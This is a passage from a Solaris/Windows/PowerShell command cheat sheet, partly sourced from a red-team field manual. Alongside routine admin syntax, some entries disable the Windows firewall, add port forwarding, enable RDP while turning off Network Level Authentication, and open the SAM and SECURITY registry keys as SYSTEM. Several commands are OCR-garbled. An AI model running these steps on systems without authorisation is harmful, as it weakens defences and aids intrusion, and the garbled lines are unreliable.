    showrev -c /usr/bin/bash                    # Information on a binary
    shutdown -i6 -gO -y                         # Restart system
    dfmounts                                    # List clients connected NFS
    smc
    snoop -d int -c pkt # -o results.pcap       # Packet capture
    /etc/vfstab                                 # File system mount table
    /var/adm/logging                            # Login attempt log
    /etc/default/'                              # Default settings
    /etc/system                                 # Kernel modules & config
    /var/adm/messages                           # Syslog location
    /etc/auto_'                                 # Automounter config files
    /etc/inet/ipnodes                           # IPv4/IPv6 host file
    
[45]:<https://www.google.hr/url?sa=t&rct=j&q=&esrc=s&source=web&cd=2&cad=rja&uact=8&ved=0ahUKEwiE1be92LDRAhUHkRQKHXnZAx8QFgggMAE&url=https%3A%2F%2Fwatchthestack.files.wordpress.com%2F2015%2F03%2Frtfm-red-team-field-manual.pdf&usg=AFQjCNGEsophTnPPNguco9UBIh0p92db_A&sig2=lEFteRB9djm24jYJoV5iTg>

Windows Versions 
----------------
[[55]]

       NT 3.1   # Windows NT 3.1 (All)
       NT 3.2   # Windows NT 3.5 (All)
       NT 3.51  # Windows NT 3.51 (All)
       NT 4.0   # Windows NT 4.0 (All)
       NT 5.0   # Windows 2000 (All)
       NT 5.1   # Windows XP (Home, Pro, MC, Tablet PC, Starter, Embedded)
       NT 5.2   # Windows XP (64-bit, Pro 64-bit), Windows Server 2003 & R2 (Standard, Enterprise), Windows Home Server
       NT 6.0   # Windows Vista (Starter, Home, Basic, Home Premium, Business, Enterprise, Ultimate), Windows Server 2008 (Foundation, Standard, Enterprise)
       NT 6.1   # Windows 7 (Starter, Home, Pro, Enterprise, Ultimate), Windows Server 2008 R2 (Foundation, Standard, Enterprise)
       NT 6.2   # Windows 8 (x86/64, Pro, Enterprise, Windows RT (ARM)), Windows Phone 8, Windows Server 2012 (Foundation, Essentials, Standard)
       NT 6.3   # Windows 8.1 (Pro, Enterprise), Windows Server 2012 R2 (Foundation, Essentials, Standard, Datacenter)
       NT 10.0  # Windows 10 (Home, Pro, Pro Education, Enterprise, Enterprise LTSB, Education, Mobile, Mobile Enterprise, IoT Core, IoT Enterprise, IoT Mobile Enterprise), Windows Server 2016 (Essentials, Standard, Datacenter)

[55]: <https://en.wikipedia.org/wiki/List_of_Microsoft_Windows_versions>
       
Startup Directories 
-------------------
[[46]]

### NT 6.1

    Personal Startup folder:
    
    %SystemDrive%\Users\<user_name>\AppData\Roaming\Microsoft\Windows\Start\ Menu\Programs\Startup
    
    All Users:
    
    %SystemDrive%\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
    
    Shortcut: Run -> shell:common startup
    
[46]: https://watchthestack.files.wordpress.com/2015/03/rtfm-red-team-field-manual.pdf
       
Useful Run Commands 
-------------------
[[48]]
    		
    access.cpl					        # Accessibility Controls
    accwiz					            # Accessibility Wizard
    hdwwiz.cpl					        # Add Hardware Wizard
    appwiz.cpl					        # Add/Remove Programs
    control admintools					# Administrative Tools
    acrobat					            # Adobe Acrobat (if installed)
    formdesigner					    # Adobe Designer (if installed)
    acrodist					        # Adobe Distiller (if installed)
    imageready					        # Adobe ImageReady (if installed)
    photoshop					        # Adobe Photoshop (if installed)
    wuaucpl.cpl					        # Automatic Updates
    fsquirt					            # Bluetooth Transfer Wizard
    calc					            # Calculator
    certmgr.msc					        # Certificate Manager
    charmap					            # Character Map
    chkdsk					            # Check Disk Utility
    clipbrd					            # Clipboard Viewer
    cmd					                # Command Prompt
    dcomcnfg					        # Component Services
    compmgmt.msc					    # Computer Management
    control					            # Control Panel
    timedate.cpl					    # Date and Time Properties
    ddeshare					        # DDE Shares
    devmgmt.msc					        # Device Manager
    directx.cpl					        # Direct X Control Panel (if installed)*
    dxdiag					            # Direct X Troubleshooter
    cleanmgr					        # Disk Cleanup Utility
    dfrg.msc					        # Disk Defragment
    diskmgmt.msc				    	# Disk Management
    diskpart					        # Disk Partition Manager
    control desktop				        # Display Properties
    desk.cpl					        # Display Properties
    control color					    # Display Properties (w/Appearance Tab Preselected)
    drwtsn32					        # Dr. Watson System Troubleshooting Utility
    verifier					        # Driver Verifier Utility
    eventvwr.msc					    # Event Viewer
    migwiz					            # Files and Settings Transfer Tool
    sigverif					        # File Signature Verification Tool
    findfast.cpl					    # Findfast
    firefox					            # Firefox (if installed)
    folders					            # Folders Properties
    control fonts					    # Fonts
    fonts					            # Fonts Folder
    freecell					        # Free Cell Card Game
    joy.cpl					            # Game Controllers
    gpedit.msc					        # Group Policy Editor (XP Prof)
    mshearts				        	# Hearts Card Game
    helpctr				            	# Help and Support
    hypertrm				        	# HyperTerminal
    iexpress				        	# Iexpress Wizard
    ciadv.msc				        	# Indexing Service
    icwconn1				        	# Internet Connection Wizard
    iexplore				        	# Internet Explorer
    inetcpl.cpl				        	# Internet Properties
    inetwiz				            	# Internet Setup Wizard
    ipconfig /all				    	# IP Configuration (Display Connection Configuration)
    ipconfig /displaydns				# IP Configuration (Display DNS Cache Contents)
    ipconfig /flushdns					# IP Configuration (Delete DNS Cache Contents)
    ipconfig /release					# IP Configuration (Release All Connections)
    ipconfig /renew					    # IP Configuration (Renew All Connections)
    ipconfig /registerdns				# IP Configuration (Refreshes DHCP & Re-Registers DNS)
    ipconfig /showclassid				# IP Configuration (Display DHCP Class ID)
    ipconfig /setclassid				# IP Configuration (Modifies DHCP Class ID)
    jpicpl32.cpl					    # Java Control Panel (if installed)
    javaws					            # Java Control Panel (if installed)
    control keyboard					# Keyboard Properties
    secpol.msc					        # Local Security Settings
    lusrmgr.msc				        	# Local Users and Groups
    logoff					            # Logs You Out Of Windows
    mrt					                # Malicious Software Removal Tool
    msaccess				        	# Microsoft Access (if installed)
    winchat					            # Microsoft Chat
    excel					            # Microsoft Excel (if installed)
    frontpg					            # Microsoft Frontpage (if installed)
    moviemk				            	# Microsoft Movie Maker
    mspaint					            # Microsoft Paint
    powerpnt				        	# Microsoft Powerpoint (if installed)
    winword				            	# Microsoft Word (if installed)
    mobsync					            # Microsoft Syncronization Tool
    winmine				            	# Minesweeper Game
    control mouse				    	# Mouse Properties
    main.cpl				        	# Mouse Properties
    nero				            	# Nero (if installed)
    conf					            # Netmeeting
    control netconnections				# Network Connections
    ncpa.cpl					        # Network Connections
    netsetup.cpl				    	# Network Setup Wizard
    notepad					            # Notepad
    nvtuicpl.cpl				    	# Nview Desktop Manager (if installed)
    packager					        # Object Packager
    odbccp32.cpl				    	# ODBC Data Source Administrator
    osk					                # On Screen Keyboard
    ac3filter.cpl				       	# Opens AC3 Filter (if installed)
    msimn				            	# Outlook Express
    pbrush					            # Paint
    password.cpl				    	# Password Properties
    perfmon.msc				        	# Performance Monitor
    perfmon				            	# Performance Monitor
    telephon.cpl				    	# Phone and Modem Options
    dialer					            # Phone Dialer
    pinball				            	# Pinball Game
    powercfg.cpl				    	# Power Configuration
    control printers					# Printers and Faxes
    printers				        	# Printers Folder
    eudcedit				        	# Private Character Editor
    QuickTime.cpl			    		# Quicktime (If Installed)
    quicktimeplayer				    	# Quicktime Player (if installed)
    realplay				        	# Real Player (if installed)
    intl.cpl			    	    	# Regional Settings
    regedit				            	# Registry Editor
    regedit32				        	# Registry Editor
    rasphone					        # Remote Access Phonebook
    mstsc					            # Remote Desktop
    ntmsmgr.msc				        	# Removable Storage
    ntmsoprq.msc				    	# Removable Storage Operator Requests
    rsop.msc					        # Resultant Set of Policy (XP Prof)
    sticpl.cpl				        	# Scanners and Cameras
    control schedtasks					# Scheduled Tasks
    wscui.cpl					        # Security Center
    services.msc					    # Services
    fsmgmt.msc					        # Shared Folders
    shutdown					        # Shuts Down Windows
    mmsys.cpl					        # Sounds and Audio
    spider				            	# Spider Solitare Card Game
    cliconfg				        	# SQL Client Configuration
    sysedit				            	# System Configuration Editor
    msconfig				        	# System Configuration Utility
    sfc /scannow				    	# System File Checker Utility (Scan Immediately)
    sfc /scanonce				    	# System File Checker Utility (Scan Once At The Next Boot)
    sfc /scanboot					    # System File Checker Utility (Scan On Every Boot)
    sfc /revert				           	# System File Checker Utility (Return Scan Setting To Default)
    sfc /purgecache					    # System File Checker Utility (Purge File Cache)
    sfc /cachesize=x					# System File Checker Utility (Sets Cache Size to size x)
    msinfo32					        # System Information
    sysdm.cpl					        # System Properties
    taskmgr				            	# Task Manager
    tcptest					            # TCP Tester
    telnet					            # Telnet Client
    tweakui					            # Tweak UI (if installed)
    nusrmgr.cpl				        	# User Account Management
    utilman				            	# Utility Manager
    wab				                	# Windows Address Book
    wabmig					            # Windows Address Book Import Utility
    ntbackup				        	# Windows Backup Utility (if installed)
    explorer				        	# Windows Explorer
    firewall.cpl				    	# Windows Firewall
    magnify				            	# Windows Magnifier
    wmimgmt.msc			        		# Windows Management Infrastructure
    wmplayer				        	# Windows Media Player
    msmsgs					            # Windows Messenger
    wiaacmgr				        	# Windows Picture Import Wizard (need camera connected)
    syskey					            # Windows System Security Tool
    wupdmgr					            # Windows Update Launches
    winver					            # Windows Version (to show which version of windows)
    tourstart				        	# Windows XP Tour Wizard
    write				            	# Wordpad
[48]:<http://mypchell.com/guides/34-guides/69-156-useful-run-commands>
    		
Systeminfo
----------

### Syntax[[54]]

    systeminfo [/s <Computer> [/u <Domain>\<UserName> [/p <Password>]]] [/fo {TABLE | LIST | CSV}] [/nh]
    
    /s  # Specifies the name or IP address of a remote computer
    /u  # Runs the command with the account permissions of the specified user account
    /p  # Specifies the password of the user account that is specified in the /u parameter
    /fo # Specifies the output format
    /nh # Suppresses column headers in the output.
    /?  # Displays help at the command prompt.
    
# Tasklist

### Syntax

    tasklist[.exe] [/s computer] [/u domain\user [/p password]] [/fo {TABLE|LIST|CSV}] [/nh] [/fi FilterName [/fi FilterName2 [ ... ]]] [/m [ModuleName] | /svc | /v]
# Reg query

### Syntax
    reg query <KeyName> [{/v <ValueName> | /ve}] [/s] [/se <Separator>] [/f <Data>] [{/k | /d}] [/c] [/e] [/t <Type>] [/z]
    
    /ve         # Runs a query for value names that are empty
    /s          # Specifies to query all subkeys and value names recursively
    /se         # Specifies the single value separator to search for in the value name type REG_MULTI_SZ
    /f          # Specifies the data or pattern to search for
    /k          # Specifies to search in key names only
    /d          # Specifies to search in data only
    /c          # Specifies that the query is case sensitive
    /e          # Specifies to return only exact matches
    /t <Type>   # Specifies registry types to search
    /z          # Specifies to include the numeric equivalent for the registry type in search results
    

[54]:<https://technet.microsoft.com/en-us/library/cc771190(v=ws.11).aspx>    		
       
Windows Net/Domain Commands
---------------------------

### Net user - Syntax[[52]]

    net user [<UserName> {<Password> | *} [<Options>]] [/domain]
    net user [<UserName> {<Password> | *} /add [<Options>] [/domain]]
    net user [<UserName> [/delete] [/domain]]
    
### Net user - Examples

    net view \\production   # To see a list of the resources shared by the \\Production computer
    net view /domain:sales  # To see a list of the computers in the sales domain or workgroup
    
### Net view - Syntax

    net view [\\ComputerName [/CACHE] | [/ALL] | /DOMAIN[:DomainName]]
    
### Net group - Syntax

    net group [<GroupName> [/comment:"<Text>"]] [/domain]
    net group [<GroupName>{/add [/comment:"<Text>"] | /delete} [/domain]]
    net group [<GroupName> <UserName>[ ...] {/add | /delete} [/domain]]
    
### Net group - Examples

    net group                                           # This example lists all the groups on the local server
    net group exec /add                                 # This example adds a group called Exec to the local user accounts database
    net group exec /add /domain                         # This example adds a group called Exec to the domain database
    net group exec estherv ralfr stevent /add           # This example adds the existing user accounts estherv, ralfr, and stevent to the Exec group on the local computer
    net group exec estherv ralfr stevent /add /domain   # This example adds the existing user accounts estherv, ralfr, and stevent to the Exec group in the domain database
    net group exec                                      # This example displays users in the Exec group
    net group exec /comment:"The executive staff"       # This example adds a comment to the Exec group record

[52]: <https://technet.microsoft.com/en-us/library/cc754051(v=ws.11).aspx>
    
Running remote commands
-----------------------

Many Windows PowerShell cmdlets have the ComputerName parameter that enables you to collect data and change settings on one or more remote computers. They use a variety of communication technologies and many work on all Windows operating systems that Windows PowerShell supports without any special configuration.[[42]]

Typically, cmdlets that support remoting without special configuration have the ComputerName parameter and do not have the Session parameter. To find these cmdlets in your session, type:

    Get-Command | where { $_.parameters.keys -contains "ComputerName" -and $_.parameters.keys -notcontains "Session"}

### Start an Interactive Session

To start an interactive session with a single remote computer, we use the Enter-PSSession cmdlet.

    Enter-PSSession Server01
    
### Exit Session

    Exit-PSSession
    
### Running a remote command

To run any command on one or many remote computers, use the Invoke-Command cmdlet. For example, to run a Get-UICulture command on the Server01 and Server02 remote computers, type:

    Invoke-Command -ComputerName Server01, Server02 {Get-UICulture}

### Output example

![Untitled.png](https://www.dropbox.com/s/k545zhqu94vn33c/Untitled.png?dl=0&raw=1)

### Run a script

    Invoke-Command -ComputerName Server01, Server02 -FilePath c:\Scripts\DiskCollect.ps1
    
### Establish a Persistent Connection
Following command creates a remote session on the Server01 computer and another remote session on the Server02 computer. It saves the session objects in the $s variable.

    $s = New-PSSession -ComputerName Server01, Server02
    
following command creates a remote session on the Server01 computer and another remote session on the Server02 computer. It saves the session objects in the $s variable.

    Invoke-Command -Session $s {$h = Get-HotFix}
    
Now you can use the data in the $h variable in subsequent commands, such as the following one. The results are displayed on the local computer.

    Invoke-Command -Session $s {$h | where {$_.installedby -ne "NTAUTHORITY\SYSTEM"}}
    
[42]: <https://msdn.microsoft.com/en-us/powershell/scripting/core-powershell/running-remote-commands>
    
Windows network commands
------------------------
[[53]]

    $ Arp                       # Display or manipulate the ARP information on a network device or computer.
    $ Finger                    # The finger command available in Unix and Linux variants allows a user to find sometimes personal information about a user. 
    $ Hostname                  # The hostname command displays the host name of the Windows XP computer currently logged into
    $ Ipconfig                  # Display the network settings currently assigned and given by a network
    $ Pathping                  # Pathping is an MS-DOS utility available for Microsoft Windows 2000 and Windows XP users. This utility enables a user to find network latency and network loss
    $ Ping                      # Pinging another address helps determine if the network card can communicate within the local network or outside network
    $ Nbstat                    # The nbtstat MS-DOS utility that displays protocol statistics and current TCP/IP connections using NBT
    $ Net                       # The net command is available in MS-DOS and Windows and is used to set, view, and determine network settings
    $ Netstat                   # The netstat command is used to display the TCP/IP network protocol statistics and information
    $ Nslookup                  # The nslookup MS-DOS utility that enables a user to do a reverse lookup on an IP address of a domain or host on a network
    $ Route                     # The route MS-DOS utility enables computers to view and modify the computer's route table
    & Tracert and traceroute    # It allows you to view a listing of how a network packet travels through the network and where it may fail or slow down
    $ Whois                     # The whois command available in Unix and Linux variants helps allow a user to identify a domain name. This command provides information about a domain name much like the WHOIS on network solutions.
    $ Winipcfg                  # The winipcfg command available in Windows allows a user to display network and network adapter information. Here, a user can find such information as an IP address, Subnet Mask, Gateway, etc.
    
[53]: <http://www.computerhope.com/issues/ch000444.htm>
    
Hidden tools in Command Line
----------------------------

NOTICE: You need to run CMD with administrator privileges [[10]]

### System file checker

    $ sfc /scannow      # This performs an immediate scan of your system and will replace files as necessary. You may need to restart Windows when it's done if it finds problems
    $ sfc /scanonce     # This performs a scan the next time you restart your system
    $ sfc /scanboot     # This schedules a scan to be performed every time you restart your system
    $ sfc Revert        # This returns the System File Checker to its default settings. You can use it to turn off the /scanboot option, for example
    
### Check disk

    $ chkdsk Volume     # If you want to check a whole drive, just type the drive letter
    $ chkdsk Filename   # You can also use chkdsk to check a single file or group of files
    $ chkdsk /F         # Run it with this option to have chkdsk go ahead and fix those errors
    $ chkdsk /R         # This option forces chkdsk to locate bad sectors and recover information from them. If chkdsk cannot lock the disk (which it usually can't since you're actually using Windows), it will prompt you run the command the next time you restart Windows

### Cipher
    
    $ cipher /W:pathname    # The /W option removes data on unused portions of a volume, effectively erasing data that may be hanging around on your hard drive after deletion. You can point cipher at an entire volume (like C:) or a specific folder
    
    NOTICE: This applies to traditional hard drives and not SSDs
    
### Driverquery

    $ driverquery /s        # This option lets you specify the name or IP address of a remote computer so that you investigate the drivers it has installed
    $ driverquery /si       # This option shows you the digital signature information for drivers
    $ driverquery /fo       # This is really the key option you'll use with driverquery. It lets you specify the format in which information is displayed so that you can more effectively save it as a report.
    
    Example: driverquery /fo CSV > drivers.csv
    
![g91lech9vvrplpbh0qnd.png](https://www.dropbox.com/s/mfgbhgugjic88vq/g91lech9vvrplpbh0qnd.png?dl=0&raw=1)
    
[10]: <http://lifehacker.com/the-best-tools-hidden-in-windows-command-line-1553193077>
    
Miscellaneous commands Windows 
------------------------------

### Lock Workstation [[37]]

    rundll32.dll user32.dll LockWorkstation
    
### Disable Windows Firewall

    netsh advfirewall set currentprofile state off
    netsh advfirewall set allprofiles state off
    
### Native Windows Port Forward

    netsh interface portproxy add v4tov4 listenport=3000
    netsh advfirewall set allprofiles state off
    
### Native Windows Port Forward

    netsh interface portproxy add v4tov4 listenport=3000
    listenaddress=l.l.l.l connectport=4000 connectaddress=2.2.2.2
    
    #Remove
    netsh interface portproxy delete v4tov4 listenport=3000
    listenaddress=l.l.l.l
    
    NOTICE: Must use administrative privileges.
    
### Re-Enable Command prompt

    reg add HKCU\Software\Policies\t1icrosoft\Windows\System /v DisableCHD /tREG DWORD /d 0 /f

[37]: <https://watchthestack.files.wordpress.com/2015/03/rtfm-red-team-field-manual.pdf>               
       
PsExec 
------

PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software.[[41]]

    # The following command launches an interactive command prompt on \\marklap:
    
    psexec \\marklap cmd
    
    # This command executes IpConfig on the remote system with the /all switch, and displays the resulting output locally
    
    psexec \\marklap ipconfig /all
    
    # This command copies the program test.exe to the remote system and executes it interactively
    
    psexec \\marklap -c test.exe
    
    # Specify the full path to a program that is already installed on a remote system if its not on the system's path
    
    psexec \\marklap c:\bin\test.exe
    
    # Run Regedit interactively in the System account to view the contents of the SAM and SECURITY keys
    
    psexec -i -d -s c:\windows\regedit.exe
    
    # To run Internet Explorer as with limited-user privileges use this command
    
    psexec -l -d "c:\program files\internet explorer\iexplore.exe"    

[41]: <https://technet.microsoft.com/en-us/sysinternals/pxexec.aspx>       

Terminal Services 
-----------------

Terminal Services provides the ability to host multiple, simultaneous client sessions on Microsoft Windows Server 2003.[[47]]

### Terminal Services Arhitecture

![aa.gif](https://www.dropbox.com/s/mon59ohqha3p7g8/aa.gif?dl=0&raw=1)

### Start RDP

    1. Create regfile.reg file with following line in it:
    HKEY LOCAL t1ACHINE\SYSTEH\CurrentControlSet \Control\ TerminalService
    2. "fDe~yTSCo~nections"=dword: 00000000
    3. reg import reg file. reg
    4. net start ''terrnservice''
    5. sc config terrnservice start= auto
    6. net start terrnservice
    
### Disable Network Level Authentification, Add Firewall Excpetion

    reg add "HKEY LOCAL t1ACHINE\SYSTEt1\CurentControlSet\Control \Terminal
    Server\WinStations\RDP-TCP" /v UserAuthentication /t REG_DWORD /d "0" /f
    netsh firewall set service type = remotedesktop mode = enable

[47]: <https://technet.microsoft.com/en-us/library/cc755399(v=ws.10).aspx>

WMIC
----

WMIC extends WMI for operation from several command-line interfaces and through batch scripts. Before WMIC, you used WMI-based applications (such as SMS), the WMI Scripting API, or tools such as CIM Studio to manage WMI-enabled computers. Without a firm grasp on a programming language such as C++ or a scripting language such as VBScript and a basic understanding of the WMI namespace, do-it-yourself systems management with WMI was difficult. WMIC changes this situation by giving you a powerful, user-friendly interface to the WMI namespace.[[51]]

### Listing 1: Code to Display

    Results at the
    Console from a WMIC Batch File
    wmic /node:SERVER1, SERVER4
        cpu get name, caption,
        maxclockspeed, systemname
        /format:textvaluelist.xsl
        
### Listing 2: Code to Use Variables in a WMIC Batch File

    @echo off
    if "%1"=="" goto msg
    if "%2"=="" goto single
    wmic /node:%1, %2 cpu get name,
     caption, maxclockspeed,
     systemname
     /format:textvaluelist.xsl
    goto end
    :single
    wmic /node:%1 cpu get name,
        caption, maxclockspeed,
        systemname
        /format:textvaluelist.xsl
    goto end
    :msg
    echo you must specify at least
        one computer name.
    :end

### Listing 3: Code to Direct WMIC Output to an HTML File
    wmic /node:SERVER4
      /output:e:\file1.htm cpu get
      description, maxclockspeed,
      extclock, manufacturer,
      revision /format:hform.xsl
### Listing 4: Code to Direct Class
    Command Output to an HTML File
wmic /output:e:\se_class.htm
      class WIN32_SOFTWAREELEMENT
      get
### Listing 5: Code to Generate XML Output from a WMIC Command
     wmic cpu get maxclockspeed
       /translate:basicxml
      /format:rawxml.xsl
[51]: <https://msdn.microsoft.com/en-us/library/bb742610.aspx>

Powershell 
----------
[[40]]

    #	                                # Comment / Remark
    $_	                                # The current pipeline object
    $variable = "value"	                # Define a variable  also: ${n!a#me} = "value"
    %	                                # Alias for ForEach-Object
    --%	                                # Stop parsing input
    & (call)	                        # Run a command, script or function
    . (source)	                        # Run a command script in the current shell
    ?           	                    # Alias for Where-Object
    @(...)	                            # Force an expression to be evaluated as an array
    #NAME?      	                    # Format operator
    Active Directory	                # Account, Computer, Group and User cmdlets
    Add-Computer	                    # Add a computer to the domain
    Add-Content	                        # Add to the content of the item
    Add-History	                        # Add entries to the session history
    Add-Member	                        # Add a member to an instance of a PowerShell object
    Add-PsSnapIn	                    # Add snap-ins to the console
    Add-Type    	                    # Add a .NET Framework type to a PowerShell session
    Add-WindowsFeature	                # Install roles, role services, and features
    Backup-GPO	                        # Backup group policy objects (GPOs)
    Backup-GPO	                        # Backup group policy objects (GPOs)
    Begin	                            # Function BEGIN block
    BITS	                            # Background Intelligent Transfer Service cmdlets
    Break	                            # Exit a program loop
    Catch	                            # Handle a terminating error within a scriptblock
    Checkpoint-Computer	                # Create a system restore point (XP)
    Checkpoint-Web	                    # Create a checkpoint for an IIS web app
    Clear-Content	                    # Remove content from a file/item
    Clear-EventLog	                    # Delete all entries from an event log
    Clear-History	                    # Delete entries from the session history
    Clear-Host	                        # Clear the screen
    Clear-Host	                        # Clear the screen
    Clear-Item	                        # Remove content from a variable or an alias
    Clear-ItemProperty	                # Remove the property value from a property
    Clear-Variable	                    # Remove the value from a variable
    Compare-Object	                    # Compare the properties of objects
    Compare-Object	                    # Compare the properties of objects
    Complete-Transaction                # Commit the transaction
    Compress-Archive                    # Create a new archive/zipped file [PS 5+]
    Connect-WSMan	                    # Connect to the WinRM service on a remote computer
    Continue	                        # Skip just this iteration of a loop
    ConvertFrom-CSV	                    # Convert object properties (in CSV format) into CSV objects
    ConvertFrom-SecureString	        # Convert a secure string into an encrypted standard string
    ConvertFrom-StringData	            # Convert a here-string into a hash table
    Convert-Path	                    # Convert a ps path to a provider path
    ConvertTo-CSV	                    # Convert .NET Framework objects into CSV variable
    ConvertTo-Html	                    # Convert the input into an HTML table
    ConvertTo-SecureString	            # Convert an encrypted standard string into a secure string
    ConvertTo-Xml	                    # Convert the input into XML
    Copy-Item	                        # Copy an item from a namespace location
    Copy-ItemProperty	                # Copy a property along with it's value
    Debug-Process	                    # Attach a debugger to a running process
    Disable-ComputerRestore	            # Disable System Restore on a drive
    Disable-PSBreakpoint	            # Disable a breakpoint in the current console
    Disable-PSRemoting	                # Disable remote session configuration on the local computer
    Disable-PSSessionConfiguration  	#  Disable session configurations on the local computer
    Disable-WSMAnCredSSP 	            # Disable Credential Security Service Provider (SSP) authentication
    Disconnect-WSMan	                # Disconnect from the WinRM service on a remote
    Do	                                # Loop while a condition is True
    Enable-ComputerRestore	            # Enable System Restore on a drive
    Enable-PSBreakpoint	                # Enable a breakpoint in the current console
    Enable-PSRemotRemoting	            # Run PowerShell commands on remote computers
    Enable-PSSessionConfiguration	    # Enable session configurations on the local computer
    Enable-WSManCredSSP 	            # Enable Credential SSP authentication
    End	                                # Function END block
    Enter-PSSessio	                    # Start an interactive session with a remote computer
    Exit-PSSession	                    # Exit PowerShell (or exit a script)
    Exit-PSSession	                    # End an interactive session with a remote computer
    Expand-Archive	                    # Extract files from an archive (zipped) file [PS
    Export-Alias	                    # Export an alias list to a file
    Export-Clixml	                    # Produce a clixml representation of PowerShell ob
    Export-Console	                    # Export console configuration to a file
    Export-Counter	                    # Export Performance Counter data to log files
    Export-Csv	                        # Export to Comma Separated Values (spreadsheet)
    Export-FormatData	                # Save formatting data from the current session
    Export-ModuleMember	                # Export specific module members
    Export-PSSession	                # Import commands and save them in a PowerShell mo
    For	                                # Loop through items that match a condition
    ForEach	                            # Loop through each item in a collection
    ForEach method	                    # Loop through each item in a collection
    ForEach-Object	                    # Reach  Loop through each item in the pipeline ( % )
    Format-Custom	                    # Format output using a customized view
    Format-List	                        # Format output as a list of properties, each on a
    Format-Table	                    # Format output as a table
    Format-Wide	                        # Format output as a table listing one property on
    Get-Acl	                            # Get permission settings for a file or registry ke
    Get-Alias	                        # Return alias names for Cmdlets
    Get-AuthenticonSignature	        # Get the signature object associated with a file
    Get-ChildItem	                    # Get child items (contents of a folder or registry)
    Get-Command	                        # Get basic information about cmdlets
    Get-Command	                        # Retrieve basic information about a command
    Get-ComputerRestorePoint	        # Get the restore points on the local computer
    Get-Content 	                    # Get content from item (specific location)
    Get-Counter	                        # Get performance counter data
    Get-Credential	                    # Get a security credential (username/password)
    Get-Culture	                        # Get region information (language and keyboard la
    Get-Date	                        # Get current date and time
    Get-DscConfiguration	            # Get the current config. of a node
    Get-DscLocalConfigurationManager	# Get Local Config Manager settings
    Get-DscResource	                    # Get Desired State Config. resources from a compute
    Get-Event	                        # Get events in the PowerShell event queue
    Get-Eventlog	                    # Get event log data (2003)
    Get-EventSubscriber	                # Get event subscribers
    Get-ExecutionPolicy	                # Get the execution policy for the shell
    Get-FormatData	                    # Get the formatting data in the current session
    Get-Help	                        # Open the help file
    Get-History  	                    # Get a listing of the session history
    Get-Host	                        # Get host information (PowerShell Version and Region)
    Get-HotFix	                        # Get Installed hotfixes
    Get-Item	                        # Get a file/registry object (or any other namespa
    Get-Item	                        # Get a file object or get a registry (or other names)
    Get-ItemProperty	                # Retrieve the properties of an object
    Get-Job	                            # Get PowerShell background jobs that are running
    Get-Location	                    # Get and display the current location
    Get-Member	                        # Enumerate the properties of an object
    Get-Module	                        # Get the modules imported to the session
    Get-Pfxcertificate	                # Get pfx certificate information
    Get-Process	                        # Get a list of processes on a machine
    Get-PSBreakpoint	                # Get the currently set breakpoints
    Get-PSDrive	                        # Get drive information (DriveInfo)
    Get-PSProvider	                    # Get information for the specified provider
    Get-PSSession	                    # Get the PSSessions in the current session
    Get-PSSessionConfiguration	        # Get the registered PS session configuration
    Get-PsSnapin	                    # List PowerShell snap-ins on this computer
    Get-Random	                        # Get a random number
    Get-Service	                        # Get a list of services
    Get-Tracesource	                    # Get components that are instrumented for tracing
    Get-Transaction	                    # Get information about the active transaction
    Get-Uiculture	                    # Get the ui culture information
    Get-Unique	                        # Get the unique items in a collection
    Get-Variable	                    # Get a PowerShell variable
    Get-WebApplicationMonitoringStatus	# Get the monitoring status of web apps
    Get-WindowsFeature	                # Retrieve roles, role services, and features
    Get-WinEvent	                    # Get event log data (Vista+)
    Get-WmiObject	                    # Get WMI class information
    Get-WSManCredSSP  	                # Get the Credential SSP configuration
    Get-WSManInstance 	                # Display management information (XML or value)
    Group-Object	                    # Group objects that contain the same value
    if	                                # Conditionally perform a command
    Import-Alias	                    # Import an alias list from a file
    Import-Clixml	                    # Import a clixml file and rebuild the PS object
    Import-Counter	                    # Import performance counter log files
    Import-Csv	                        # Take values from a CSV list and send objects dow
    Import-GPO	                        # Import Group Policy settings into a specified GPO
    Import-Module	                    # Add a module to the session
    Import-PSSession	                # Import commands from another session
    Invoke-Command	                    # Run commands on local and remote computers
    Invoke-Command	                    # Run command
    Invoke-Express	                    # Run a PowerShell expression
    Invoke-History	                    # Invoke a previously executed Cmdlet
    Invoke-Item	                        # Invoke an executable or open a file (START)
    Invoke-WmiMethod	                # Call WMI methods
    Invoke-WSManAction	                # Invoke an action on a specified object
    Job Trigger cmdlets	                # Get/Set Scheduled job triggers
    Join-Path	                        # Combine a path and child-path
    Limit-EventLog	                    # Limit the size of the event log
    Measure-Command	                    # Measure running time
    Measure-Object	                    # Measure the properties of an object
    Move-Item	                        # Move an item from one location to another
    Move-ItemProperty	                # Move a property from one location to another
    New-Alias	                        # Create a new alias.
    New-DSCCheckSum	                    # Create checksum files for DSC docs/resources
    New-Event	                        # Create a new event
    New-Eventlog	                    # Create a new event log and a new event source
    New-Item   	                        # Create a new item in a namespace
    New-ItemProperty	                # Set a new property
    New-Module	                        # Create a new dynamic module (only in memory)
    New-Object	                        # Create a new .Net object
    New-PSDrive	                        # Create a mapped network drive
    New-PSSession	                    # Create a persistent connection to a local or remote
    New-PSSessionOption	                # Advanced options for a PSSession
    New-Service	                        # Create a new service
    New-Timespan	                    # Create a timespan object
    New-Variable	                    # Create a new variable
    New-WebServiceProxy	                # Create a Web service proxy object
    New-WSManInstance 	                # Create a new instance of a management resource
    New-WSManSessionOption 	            # Options for WSMan commands
    Out-Default	                        # Send output to default
    Out-File	                        # Send output to a file
    Out-GridView	                    # Send output to an interactive table
    Out-Host	                        # Send output to the host
    Out-Null	                        # Send output to null
    Out-Printer	                        # Send the output to a printer
    Out-String	                        # Send objects to the host as strings
    Param	                            # Script Parameters
    Pause	                            # Pause and display the message "Press Enter to continue"
    Pop-Location	                    # Set the current working location from the stack
    Pop-Location	                    # Set the current working location from the stack
    Powershell	                        # Launch a PowerShell session
    Process	                            # Function PROCESS block
    Push-Location	                    # Push a location to the stack
    Push-Location	                    # Push a location to the stack
    Quest AD 	                        # Read and write to Active Directory
    Read-Host	                        # Read a line of input from the host console
    Read-Host	                        # Read a line of input from the host console
    Receive-Job	                        # Get PowerShell background job results
    Register-EngineEvent 	            # Subscribe to PowerShell events
    Register-ObjectEvent   	            # Subscribe to .NET events
    Register-PSSessionConfiguration 	# Create and register a new PS session confi
    Register-WmiEvent	                # Subscribe to a WMI event
    Remove-Computer	                    # Remove the local computer from a workgroup or doma
    Remove-Event	                    # Delete events from the event queue
    Remove-EventLog	                    # Delete an event log
    Remove-Item  D	                    # se/rd/rm/rmdir   Delete an item
